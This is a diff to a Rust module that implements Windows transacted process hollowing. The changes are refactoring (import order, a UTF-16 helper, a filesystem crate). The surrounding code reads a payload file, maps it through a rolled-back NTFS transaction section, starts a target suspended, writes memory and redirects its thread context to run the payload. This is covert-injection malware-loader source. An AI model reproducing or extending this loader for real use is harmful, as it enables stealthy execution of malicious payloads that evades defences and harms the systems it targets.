@@ -4,36 +4,39 @@
 
 extern crate alloc;
 
+use alloc::vec::Vec;
 use core::ffi::c_void;
 use core::hint::spin_loop;
+use core::iter::once;
 use core::mem::zeroed;
 use core::ops::Deref;
 use core::ptr::{copy_nonoverlapping, null, null_mut};
-use utils::WideString;
-use utils::path::Path;
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::FileSystem;
+use windows_sys::core::{PCWSTR, PWSTR};
 use windows_sys::Win32::Foundation::{
-    BOOL, CloseHandle, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS,
+    CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS,
     STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS, TRUE,
 };
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 use windows_sys::Win32::Storage::FileSystem::{
-    CREATE_ALWAYS, CreateFileTransactedW, CreateFileW, CreateTransaction, FILE_ATTRIBUTE_NORMAL,
-    FILE_SHARE_READ, GetFileSize, OPEN_EXISTING, RollbackTransaction, WriteFile,
+    CreateFileTransactedW, CreateFileW, CreateTransaction, GetFileSize, RollbackTransaction,
+    WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING,
 };
 use windows_sys::Win32::System::Diagnostics::Debug::{
-    CONTEXT, CONTEXT_INTEGER_AMD64, CONTEXT_INTEGER_X86, GetThreadContext, IMAGE_FILE_HEADER,
-    IMAGE_NT_OPTIONAL_HDR64_MAGIC, SetThreadContext, WriteProcessMemory,
+    GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_INTEGER_AMD64,
+    CONTEXT_INTEGER_X86, IMAGE_FILE_HEADER, IMAGE_NT_OPTIONAL_HDR64_MAGIC,
 };
 use windows_sys::Win32::System::Memory::{
-    CreateFileMappingW, FILE_MAP_READ, MEM_COMMIT, MEM_RESERVE, MapViewOfFile, PAGE_READONLY,
-    PAGE_READWRITE, SEC_IMAGE, SECTION_ALL_ACCESS, SECTION_FLAGS, UnmapViewOfFile, VirtualAlloc,
+    CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualAlloc, FILE_MAP_READ, MEM_COMMIT,
+    MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SECTION_FLAGS, SEC_IMAGE,
 };
 use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 use windows_sys::Win32::System::Threading::{
-    CREATE_NO_WINDOW, CREATE_SUSPENDED, DETACHED_PROCESS, PROCESS_INFORMATION, ResumeThread,
+    ResumeThread, CREATE_NO_WINDOW, CREATE_SUSPENDED, DETACHED_PROCESS, PROCESS_INFORMATION,
     STARTUPINFOW,
 };
-use windows_sys::core::{PCWSTR, PWSTR};
 
 type PVoid = *mut c_void;
 type PByte = *mut u8;
@@ -135,7 +138,7 @@ pub fn make_transacted_section<S>(
 where
     S: AsRef<str>,
 {
-    let dummy_name = dummy_name.as_ref().to_wide();
+    let dummy_name = to_wide(dummy_name.as_ref());
 
     let options = 0u32;
     let isolation_lvl = 0u32;
@@ -219,8 +222,8 @@ where
     C: AsRef<str>,
     S: AsRef<str>,
 {
-    let mut cmd_line = cmd_line.as_ref().to_wide();
-    let mut start_dir = start_dir.as_ref().to_wide();
+    let mut cmd_line = to_wide(cmd_line.as_ref());
+    let mut start_dir = to_wide(start_dir.as_ref());
 
     let mut si: STARTUPINFOW = unsafe { zeroed() };
     si.cb = size_of::<STARTUPINFOW>() as u32;
@@ -283,7 +286,7 @@ pub fn get_payload_buffer<S>(filename: S) -> Option<(PByte, usize)>
 where
     S: AsRef<str>,
 {
-    let filename = filename.as_ref().to_wide();
+    let filename = to_wide(filename.as_ref());
     let file = unsafe {
         CreateFileW(
             filename.as_ptr(),
@@ -343,6 +346,10 @@ where
     }
 
     Some((local_copy_address, payload_size))
+}
+
+fn to_wide(str: &str) -> Vec<u16> {
+    str.encode_utf16().chain(once(0)).collect()
 }
 
 fn thread_context(pi: &PROCESS_INFORMATION) -> Option<CONTEXT> {
@@ -470,7 +477,7 @@ fn redirect_to_payload(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORM
 
 pub fn hollow(target: &Path, payload: PByte, payload_size: usize) -> Option<PROCESS_INFORMATION> {
     let tmp = Path::temp_file("tmp");
-    let _ = tmp.create_file();
+    let _ = StorageFileSystem.create_file(&tmp);
 
     let section = make_transacted_section(tmp.deref(), payload, payload_size).ok()?;
 
